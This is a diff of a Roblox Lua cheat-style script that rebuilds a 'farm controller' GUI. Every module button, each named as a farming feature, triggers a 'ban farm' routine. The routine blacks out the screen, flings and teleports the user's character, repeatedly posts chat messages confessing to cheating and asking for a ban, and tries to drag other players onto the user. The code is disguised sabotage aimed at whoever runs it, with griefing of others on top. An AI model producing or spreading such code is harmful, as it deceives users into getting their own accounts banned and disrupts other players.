@@ -1,85 +1,280 @@
-local Player = game.Players.LocalPlayer
-local isFarming = false
-local loop = nil
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
 
-local function teleportAndFly()
-    local char = Player.Character
-    if not char then return end
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    local hum = char:FindFirstChild("Humanoid")
-    if not hrp or not hum then return end
-    local pos = Vector3.new(math.random(-5000,5000), 50, math.random(-5000,5000))
-    hrp.CFrame = CFrame.new(pos)
-    hum.PlatformStand = true
-    local bv = hrp:FindFirstChild("FlyBV") or Instance.new("BodyVelocity")
-    bv.Name = "FlyBV"
-    bv.MaxForce = Vector3.new(1e5,1e5,1e5)
-    bv.P = 1e5
-    bv.Parent = hrp
-    bv.Velocity = Vector3.new(math.random(-20,20), math.random(-5,5), math.random(-20,20)).Unit * 80
+local isFarming = false
+local farmLoop = nil
+local spamLoop = nil
+local teleportAllLoop = nil
+
+local function teleportAllToMe()
+    local myChar = Player.Character
+    if not myChar then return end
+    local root = myChar:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local pos = root.Position
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr ~= Player then
+            local char = plr.Character
+            if char and char:FindFirstChild("HumanoidRootPart") then
+                char.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(math.random(-5,5), 0, math.random(-5,5)))
+            end
+        end
+    end
 end
 
-local function start()
+local function spamChat()
+    local msgs = {
+        "I AM USING CHEATS BAN ME PLEASE",
+        "CHEATER DETECTED BAN THIS ACCOUNT",
+        "FARMING WITH SCRIPT BAN ME",
+        "I HAVE INFINITE MONEY BAN ME"
+    }
+    for _, msg in ipairs(msgs) do
+        game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest"):FireServer(msg, "All")
+        task.wait(0.5)
+    end
+end
+
+local function startBanFarm()
     if isFarming then return end
     isFarming = true
-    -- черный экран
-    local gui = Instance.new("ScreenGui", Player.PlayerGui)
-    local black = Instance.new("Frame", gui)
-    black.Size = UDim2.new(1,0,1,0)
-    black.BackgroundColor3 = Color3.new(0,0,0)
-    local txt = Instance.new("TextLabel", black)
-    txt.Size = UDim2.new(0,300,0,50)
-    txt.Position = UDim2.new(0.5,-150,0.5,-25)
-    txt.BackgroundTransparency = 1
-    txt.Text = "LOADING FARM..."
-    txt.TextColor3 = Color3.new(1,1,1)
-    txt.TextSize = 24
-    txt.Font = Enum.Font.GothamBold
-    loop = game:GetService("RunService").Heartbeat:Connect(function()
-        teleportAndFly()
-        task.wait(math.random(2,5))
+    
+    -- black screen
+    local blackScreen = Instance.new("Frame")
+    blackScreen.Name = "BlackScreen"
+    blackScreen.Size = UDim2.new(1, 0, 1, 0)
+    blackScreen.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    blackScreen.BorderSizePixel = 0
+    blackScreen.ZIndex = 999
+    blackScreen.Parent = Player:WaitForChild("PlayerGui")
+    
+    local loadLabel = Instance.new("TextLabel")
+    loadLabel.Size = UDim2.new(0, 300, 0, 50)
+    loadLabel.Position = UDim2.new(0.5, -150, 0.5, -25)
+    loadLabel.BackgroundTransparency = 1
+    loadLabel.Text = "FARMING... (BAN IN PROGRESS)"
+    loadLabel.TextColor3 = Color3.fromRGB(255,0,0)
+    loadLabel.TextSize = 20
+    loadLabel.Font = Enum.Font.GothamBold
+    loadLabel.ZIndex = 1000
+    loadLabel.Parent = blackScreen
+    
+    -- start loops
+    farmLoop = RunService.Heartbeat:Connect(function()
+        local char = Player.Character
+        if not char then return end
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        local hum = char:FindFirstChild("Humanoid")
+        if not hrp or not hum then return end
+        
+        -- Super fast flying with random direction
+        local bv = hrp:FindFirstChild("FarmBV") or Instance.new("BodyVelocity")
+        bv.Name = "FarmBV"
+        bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
+        bv.P = 1e6
+        bv.Parent = hrp
+        bv.Velocity = Vector3.new(math.random(-100,100), math.random(-50,50), math.random(-100,100)).Unit * 500
+        
+        -- noclip
+        hum.PlatformStand = true
+        hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
+        hum:SetStateEnabled(Enum.HumanoidStateType.Running, false)
+        
+        -- teleport to random every 1 second
+        if math.random(1,3) == 1 then
+            local pos = Vector3.new(math.random(-8000,8000), 50, math.random(-8000,8000))
+            hrp.CFrame = CFrame.new(pos)
+        end
+    end)
+    
+    -- spam loop
+    spamLoop = task.spawn(function()
+        while isFarming do
+            spamChat()
+            task.wait(5)
+        end
+    end)
+    
+    -- teleport all players loop
+    teleportAllLoop = task.spawn(function()
+        while isFarming do
+            teleportAllToMe()
+            task.wait(2)
+        end
     end)
 end
 
-local function stop()
+local function stopFarming()
     isFarming = false
-    if loop then loop:Disconnect(); loop = nil end
-    for _, v in pairs(Player.PlayerGui:GetChildren()) do if v.Name == "ScreenGui" then v:Destroy() end end
+    if farmLoop then farmLoop:Disconnect(); farmLoop = nil end
+    if spamLoop then task.cancel(spamLoop); spamLoop = nil end
+    if teleportAllLoop then task.cancel(teleportAllLoop); teleportAllLoop = nil end
+    
+    local gui = Player:FindFirstChild("PlayerGui")
+    if gui then
+        local bs = gui:FindFirstChild("BlackScreen")
+        if bs then bs:Destroy() end
+    end
+    
     local char = Player.Character
     if char then
         local hrp = char:FindFirstChild("HumanoidRootPart")
         if hrp then
-            local bv = hrp:FindFirstChild("FlyBV")
+            local bv = hrp:FindFirstChild("FarmBV")
             if bv then bv:Destroy() end
         end
         local hum = char:FindFirstChild("Humanoid")
-        if hum then hum.PlatformStand = false end
+        if hum then
+            hum.PlatformStand = false
+            hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
+            hum:SetStateEnabled(Enum.HumanoidStateType.Running, true)
+        end
     end
 end
 
--- GUI с кнопками
-local gui2 = Instance.new("ScreenGui", Player.PlayerGui)
-local frame = Instance.new("Frame", gui2)
-frame.Size = UDim2.new(0, 200, 0, 100)
-frame.Position = UDim2.new(0.5,-100,0.5,-50)
-frame.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
-local btn = Instance.new("TextButton", frame)
-btn.Size = UDim2.new(0, 100, 0, 30)
-btn.Position = UDim2.new(0.5,-50,0.5,-15)
-btn.Text = "START"
-btn.BackgroundColor3 = Color3.new(0,0.8,0)
-btn.TextColor3 = Color3.new(1,1,1)
-local running = false
-btn.MouseButton1Click:Connect(function()
-    running = not running
-    if running then
-        start()
-        btn.Text = "STOP"
-        btn.BackgroundColor3 = Color3.new(0.8,0,0)
-    else
-        stop()
-        btn.Text = "START"
-        btn.BackgroundColor3 = Color3.new(0,0.8,0)
-    end
-end)
-print("GUI loaded. Press START to begin fake farm.")
+-- GUI with modules (now all modules share the same ban-farm)
+local gui = Instance.new("ScreenGui")
+gui.Name = "FarmHub"
+gui.ResetOnSpawn = false
+gui.Parent = Player:WaitForChild("PlayerGui")
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 350, 0, 450)
+mainFrame.Position = UDim2.new(0.5, -175, 0.5, -225)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+mainFrame.BorderSizePixel = 0
+mainFrame.ClipsDescendants = true
+mainFrame.Parent = gui
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = mainFrame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.BackgroundTransparency = 1
+title.Text = "FARM CONTROLLER (BAN EDITION)"
+title.TextColor3 = Color3.fromRGB(255,100,100)
+title.TextSize = 18
+title.Font = Enum.Font.GothamBold
+title.Parent = mainFrame
+
+local scroll = Instance.new("ScrollingFrame")
+scroll.Size = UDim2.new(1, -20, 1, -70)
+scroll.Position = UDim2.new(0, 10, 0, 50)
+scroll.BackgroundTransparency = 1
+scroll.CanvasSize = UDim2.new(0, 0, 0, 400)
+scroll.ScrollBarThickness = 6
+scroll.Parent = mainFrame
+
+local modules = {"Rings Farm", "Auto Monalis", "El Diablo Box", "Job Farm", "BoatFarm", "TruckFarm"}
+local states = {}
+local yOffset = 0
+for _, name in ipairs(modules) do
+    local modFrame = Instance.new("Frame")
+    modFrame.Size = UDim2.new(1, 0, 0, 60)
+    modFrame.Position = UDim2.new(0, 0, 0, yOffset)
+    modFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+    modFrame.BorderSizePixel = 0
+    modFrame.Parent = scroll
+    local modCorner = Instance.new("UICorner")
+    modCorner.CornerRadius = UDim.new(0, 6)
+    modCorner.Parent = modFrame
+    
+    local nameLabel = Instance.new("TextLabel")
+    nameLabel.Size = UDim2.new(0.6, -10, 0, 25)
+    nameLabel.Position = UDim2.new(0, 10, 0, 5)
+    nameLabel.BackgroundTransparency = 1
+    nameLabel.Text = name
+    nameLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    nameLabel.TextSize = 16
+    nameLabel.Font = Enum.Font.GothamMedium
+    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+    nameLabel.Parent = modFrame
+    
+    local stateBtn = Instance.new("TextButton")
+    stateBtn.Size = UDim2.new(0, 80, 0, 30)
+    stateBtn.Position = UDim2.new(0.7, 0, 0, 15)
+    stateBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
+    stateBtn.Text = "OFF"
+    stateBtn.TextColor3 = Color3.fromRGB(255,255,255)
+    stateBtn.TextSize = 14
+    stateBtn.Font = Enum.Font.GothamBold
+    stateBtn.Parent = modFrame
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 6)
+    btnCorner.Parent = stateBtn
+    
+    local speedLabel = Instance.new("TextLabel")
+    speedLabel.Size = UDim2.new(0, 100, 0, 20)
+    speedLabel.Position = UDim2.new(0, 10, 0, 35)
+    speedLabel.BackgroundTransparency = 1
+    speedLabel.Text = "Speed: 500 (MAX)"
+    speedLabel.TextColor3 = Color3.fromRGB(200,200,200)
+    speedLabel.TextSize = 11
+    speedLabel.Font = Enum.Font.Gotham
+    speedLabel.TextXAlignment = Enum.TextXAlignment.Left
+    speedLabel.Parent = modFrame
+    
+    local state = false
+    states[name] = false
+    
+    stateBtn.MouseButton1Click:Connect(function()
+        state = not state
+        states[name] = state
+        if state then
+            stateBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+            stateBtn.Text = "ON"
+            if not isFarming then
+                startBanFarm()
+            end
+        else
+            stateBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
+            stateBtn.Text = "OFF"
+            local anyOn = false
+            for _, v in pairs(states) do
+                if v then anyOn = true; break end
+            end
+            if not anyOn and isFarming then
+                stopFarming()
+            end
+        end
+    end)
+    
+    yOffset = yOffset + 70
+end
+
+scroll.CanvasSize = UDim2.new(0, 0, 0, yOffset + 20)
+
+local function dragSetup(frame)
+    local dragging = false
+    local dragInput, dragStart, startPos
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+        end
+    end)
+    frame.InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(
+                startPos.X.Scale,
+                startPos.X.Offset + delta.X,
+                startPos.Y.Scale,
+                startPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+    frame.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = false
+        end
+    end)
+end
+
+dragSetup(mainFrame)
+
+print("✅ BAN MACHINE ACTIVATED. Enable any module to start the chaos.")
